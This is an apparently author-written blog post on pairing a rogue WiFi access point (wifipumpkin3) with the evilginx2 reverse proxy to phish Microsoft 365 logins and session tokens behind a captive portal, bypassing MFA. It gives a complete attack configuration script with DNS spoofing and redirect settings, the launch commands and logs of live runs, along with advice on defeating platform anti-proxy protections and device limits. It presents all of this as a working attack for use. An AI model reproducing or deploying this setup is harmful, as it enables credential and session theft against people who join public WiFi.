---
title: "Wifipumpkin3 + evilginx2 - Microsoft365 Captive Portal Login Attack"
date: 2024-03-27 5:00:21 -0500
categories: phishkin3
badges:
 - type: post
   tag: 1.1.7
 - type: info
   tag: phishkin3 proxies 
---


### Introduction

A blackhat started implementing a type of attack using wifipumpkin3 + evilginx2 and raised this issue on the Wifipumpkin3 Community Discord. My response was yes, it is possible to merge these two tools and create an attack to gain access to user accounts that decide to connect to public WiFi. However, I avoided implementing this feature for two reasons:

1 - Implementing a reverse proxy from scratch when there are already several available and going through the same issues others have had is not very smart.
2 - The idea was to create something modular and let users code their .yaml files and parsers to bypass the validations that platforms put in place to mitigate this type of attack.

When I saw evilginx2 starting to do reason 2, I realized that I could just add support in wp3 and the reverse proxy would be the attacker's choice (I did my part). So, I told the User (Blackhat) that I would implement support for executing external phishing, where WP3 would only act as an intermediary similar to the reverse proxy.


![RR](/assets/img/posts/phishkin3/phishkin3_diagram.png)

The representation above shows the initial sketch of what would be the new proxy called phishkin3. As we can see, the new proxy would be responsible for creating a connection between the external host and the victim who connects to the WiFi. However, for this attack to be successful, the external host must also do its part so that after the procedures, the user is actually validated and allowed to connect to the internet after logging in.

Let's better understand all these processes:

- The victim enters the Fake WIFI, this step without internet access, and soon receives a popup prompting them to log in to the network.
- After sending a request to the phishkin3 proxy, it returns an HTTP 302 redirecting to the Phishing page hosted on the external host (using evilginx2, for example).
- The external host starts the login process using MFA, e.g., Microsoft Office365.
- The external host captures the victim's session or even the password using reverse proxy with JavaScript.
- The external host sends a 302 to http://localhost/auth/finish and the phishkin3 proxy grants internet access permission.

This way, the victim can have MFA configured, and everything will work, and the result will be the same as falling for a web phishing, but with even greater control.

### Configuring the Attack on localhost

Let's go, the first thing we need to know is that we are going to run the attack locally to understand how this would be possible using the evilgnix3 + wifipumpkin3 (wp3) tool. Let's skip the installation process of this tool; an important fact is that evilginx2 v3.0 now does not have a predefined phishlets as before. Now you will have to look at the documentation to develop your own or use some functional free ones you find on GitHub, for example. This change was very good for the community because it makes it difficult for platforms to create patch fixes. In my case, I have already done my tests and I already have a functional Office365 template.

Keep in mind that wp3 works as a malicious router; we have DNSServer and DHCPServer, and we are literally in the middle of communication between the client x server (MITM). This means that we can create a fake DNS with any name except the exact name of the target platform due to the HSTS preload that will act in this case and block the attack.

 <pre class="code">
+-------------------------------------------------------------+
|                                                             |
+-------------------------------------------------------------+
+-------------------------------------------------------------+
|      Client <======>   WP3 (Router) <========>    WEB       |
+-------------------------------------------------------------+
</pre>
 
Let's create a domain called yourfakedomain.com in our /etc/hosts and create its subdomains so that when the redirect happens in the development environment, all calls will be directed to the local IP because we need to create a testing environment for evilginx2 with everything configured, and with this, we can develop a phishlet on the fly.

![RR](/assets/img/posts/phishkin3/etchosts.png)

![RR](/assets/img/posts/phishkin3/office365.png)

Note that this process must be manual based on the proxy_hosts field of the Microsoft365.yaml configuration in evilginx2 Phishlets.

Now we can configure our evilginx2 with the local settings.

![RR](/assets/img/posts/phishkin3/evilgnix2config.png)

Note that, highlighted in red, our domain, external_ip, and bind_ip are configured in accordance (I always wanted to use that word) with our /etc/hosts, and highlighted in green, we have a bind error because our environment was not set up.

![RR](/assets/img/posts/phishkin3/evilgnix2lures.png)

A very important step is to configure the evilginx2 redirect_url so that step 5 is executed, and internet access permission is granted by the fake AP. If you are interested, the /verify path can be changed via wp3 configuration using the set phishkin3.allow_user_login_endpoint command. This way, a patch can be inserted using a hash, for example, making some analysis difficult.

In wp3, we must set up a DNS spoof attack where we will add all the domains configured in /etc/hosts so that in the resolution process of the DNSServer in wp3, they are linked to the address 172.16.0.1, and all clients connected to the Fake AP when sending a DNS query to yourfakedomain.com for an HTTP query will be redirected to the evilginx2 server.

``` sh
-- cut here file: evilnix_config.pulp 
set interface wlxc83a35cef744
dhcpconf 1
set proxy phishkin3 true
set phishkin3.cloud_url_phishing https://login.yourfakedomain.com/woqfrPHo
set phishkin3.proxy_port 8080
set phishkin3.redirect_url_after_login https://google.com
set phishkin3.allow_user_login_endpoint /verify
use spoof.dns_spoof
add login.yourfakedomain.com
add account.yourfakedomain.com
add *.yourfakedomain.com
set redirectTo 172.16.0.1
start
back
start
```

Note that our .pulp script contains some important information to mention.

1 - We set our Wireless card that we will use in the attack.
2 - We change the DHCPServer configuration to 1, which will be the IP range where we will perform the attack, where the gateway will be 172.16.0.1.

``` sh
wp3 > dhcpconf

[*] DHCP Server Option:
=======================

   Id | Class   | IP address range            | Netmask       | Router
------+---------+-----------------------------+---------------+-------------
    0 | A       | 10.0.0.20/10.0.0.50         | 255.0.0.0     | 10.0.0.1
    1 | B       | 172.16.0.100/172.16.0.150   | 255.240.0.0   | 172.16.0.1
    2 | C       | 192.168.0.100/192.168.0.150 | 255.255.255.0 | 192.168.0.1

[*] DHCP Server Settings:
=========================

 broadcast=172.16.0.255
 classtype=A
 leasetimeDef=600
 leasetimeMax=7200
 netmask=255.240.0.0
 range=172.16.0.100/172.16.0.150
 router=172.16.0.1 <------------------ WP router
 subnet=172.16.0.0
```

3 - We enable the phishkin3 proxy. 

4 - We set the URL generated by evilgnix, e.g., in our lures 0 command.

```sh
: lures 

+-----+---------------+-----------+------------+-------------+------------+-------------------+-------+
| id  |   phishlet    | hostname  |   path     | redirector  | ua_filter  |   redirect_url    |  og   |
+-----+---------------+-----------+------------+-------------+------------+-------------------+-------+
| 0   | microsoft365  |           | /woqfrPHo  |             |            | http://172.16...  | ----  |
+-----+---------------+-----------+------------+-------------+------------+-------------------+-------+
```

5 - We set the proxy port to 8080 (this wasn't really necessary).

6 - We configure the redirect that will be done after the login process is completed; in this case, it will be google.com, and below, we configure the GET path to grant internet access after the login process is finished.

7 - Now, just configure the DNSspoof plugin and all the subdomains we configured in /etc/hosts.

8 - Now, we just start the attack.

### Running the Attack 

With everything previously configured, we will execute the two tools following this scheme: First, we run wp3 using the evilginx2_config.pulp script, and then, after the AP is created, we run evilginx2.

```s
λ mh4x0f [~/scripts] $ sudo wp3 -p evilnix_config.pulp               

  _      ___ _____     ___                  __    _      ____
 | | /| / (_) __(_)___/ _ \__ ____ _  ___  / /__ (_)__  |_  /
 | |/ |/ / / _// /___/ ___/ // /  ' \/ _ \/  '_// / _ \_/_ < 
 |__/|__/_/_/ /_/   /_/   \_,_/_/_/_/ .__/_/\_\/_/_//_/____/ 
                                   /_/                       
                                            codename: Gao
by: @mh4x0f - P0cL4bs Team | version: 1.1.7 main
[*] Session id: 9794816e-eb6c-11ee-a7e5-fd5405389990 

[*] mode: script

[*] plugin: evilnix_config.pulp
===============================


[*] DnsSpoof attack
===================

[*] Redirect to: 172.16.0.1 

[*] Targets:
============

[*] -> [login.yourfakedomain.com] 
[*] -> [account.yourfakedomain.com] 
[*] -> [*.yourfakedomain.com] 
[*] module: dns_spoof running in background
[*] use jobs command displays the status of jobs started
[+] enable forwarding in iptables...
[*] sharing internet connection with NAT...
[*] setting interface for sharing internet: wlp0s20f3 
[*] settings for Phishkin3 portal:
[*] allow FORWARD UDP DNS
[*] allow traffic to Phishkin3 captive portal
[*] block all other traffic in access point
[*] redirecting HTTP traffic to captive portal
[+] starting hostpad pid: [84107]
wp3 > [+] hostapd is running

...

 [  pydns_server  ] 09:30:17  -  11: login.yourfakedomain.com. 300     IN      A       172.16.0.1 
 [  pydns_server  ] 09:30:18  -  12: account.yourfakedomain.com. 300     IN      A       172.16.0.1 
 [  pydns_server  ] 09:30:18  -  13: *.yourfakedomain.com.   300     IN      A       172.16.0.1 
 [  pydns_server  ] 09:30:18  - 13 zone resource records generated from zone file 
 [  phishkin3  ] 09:30:18  - [*] phishkin3 v1.0.2 - subtool from wifipumpkin3
 * Serving Flask app 'wifipumpkin3.plugins.bin.phishkin3'
 * Debug mode: off
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on http://172.16.0.1:8080
Press CTRL+C to quit
```


```sh
λ mh4x0f [~/git/evilginx2] at  master ?
$ sudo ./build/evilginx -p phishlets -developer                                [04ca6a3]

                                         
                                             ___________      __ __           __               
                                             \_   _____/__  _|__|  |    ____ |__| ____ ___  ___
                                              |    __)_\  \/ /  |  |   / __ \|  |/    \\  \/  /
                                              |        \\   /|  |  |__/ /_/  >  |   |  \>    < 
                                             /_______  / \_/ |__|____/\___  /|__|___|  /__/\_ \
                                                     \/              /_____/         \/      \/
                                         
                                                        - --  Community Edition  -- -
                                         
                                               by Kuba Gretzky (@mrgretzky)     version 3.1.0
                                         

[09:30:29] [inf] Evilginx Mastery Course: https://academy.breakdev.org/evilginx-mastery (learn how to create phishlets)
[09:30:29] [inf] loading phishlets from: phishlets
[09:30:29] [inf] loading configuration from: /root/.evilginx
[09:30:29] [inf] blacklist: loaded 1 ip addresses and 0 ip masks
[09:30:29] [!!!] Failed to start nameserver on: 172.16.0.1:53

+---------------+-----------+-------------+-------------------+
|   phishlet    |  status   | visibility  |     hostname      |
+---------------+-----------+-------------+-------------------+
| example       | disabled  | visible     |                   |
| microsoft365  | enabled   | visible     | yourfakedomai...  |
+---------------+-----------+-------------+-------------------+

: ---- 09:30:53 [001] WARN: Cannot handshake client login.microsoftonline.com remote error: tls: unknown certificate
[09:30:53] [war] session cookie not found: https://login.yourfakedomain.com/woqfrPHo (172.16.0.101) [microsoft365]
[09:30:53] [imp] [0] [microsoft365] new visitor has arrived: Mozilla/5.0 (Linux; Android 10; MI 8; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.119 Mobile Safari/537.36 (172.16.0.101)
[09:30:53] [inf] [0] [microsoft365] landing URL: https://login.yourfakedomain.com/woqfrPHo
[09:36:36] [war] session cookie not found: https://login.yourfakedomain.com/woqfrPHo (172.16.0.1) [microsoft365]
[09:36:36] [imp] [1] [microsoft365] new visitor has arrived: Mozilla/5.0 (Windows NT 10.0; rv:123.0) Gecko/20100101 Firefox/123.0 (172.16.0.1)
[09:36:36] [inf] [1] [microsoft365] landing URL: https://login.yourfakedomain.com/woqfrPHo
```

[![Video](/assets/img/posts/phishkin3/odysee_screen.png)](https://odysee.com/@wifipumpkin3:7/wifipumpkin3andevilginx2:b "")



### Limitations 

This attack has some limitations. First, if the target has a physical token like Yubikey using U2F, it won't work because these devices perform a handshake with the target platform, and thus the auth is aborted.

A second issue is OS patching. In the case of Android 10 and below, this attack will work as described in the video, even in localhost, because of the WebView implemented by Android 10, which accepts any kind of valid certificate. Above Android 11, you'll encounter something like:


```sh
This Connection is UnTrusted
```

This is because the Android webview implementation doesn't trust the generated certificate, and the communication isn't established.

Continuing on the same point, some Android devices don't make the request to the /generate_204 endpoint that triggers a popup saying you need to log in to the network.

On Apple devices, this request isn't made, and usually, when it does happen, it redirects the victim to the default browser, which also has limitations for untrusted connections.

Another relevant point to mention is that big companies like Microsoft and Google develop mitigations so that their platforms don't work well with reverse proxies, and usually, a blank screen is shown in response. The solution is done on the proxy side, debugging and removing these protections using JavaScript by not responding to a request for a certain subdomain.

In summary, all OS limitations can be solved by setting up a 2.0 phishing page in the cloud with SSL configured; this avoids many problems that can occur with reverse proxies.

### Conclusion 

From a security standpoint, Microsoft Office365 has taken some measures to mitigate the attack, applying a login confirmation through the Authenticator app when there's a change in the token being loaded into another browser. This behavior can be observed in the video demo. Some questions arise: what will happen if the user doesn't use the MicroSoft Authenticator? Will 2FA be asked again? If the attacker uses a proxy and tries to log in with the captured token, considering another country or state, will the session continue to work? For the second question, I believe that 2FA will be asked again as a way to mitigate the attack because I've observed this behavior via VPN on an account without additional configurations. Therefore, what we must keep in mind is that as long as security depends on a user action, there will always be ways to bypass these protections, so if you think a physical key will make you immune to phishing attacks, remember this: "The physical token is still a user action."

keep doing, hack the planet. 

References:

```
https://help.evilginx.com/docs/getting-started/deployment/local
https://www.cyberpunk.rs/evilginx-phishing-examples-v2-x-linkedin-facebook-custom
https://github.com/P0cL4bs/wifipumpkin3
https://github.com/kgretzky/evilginx2
```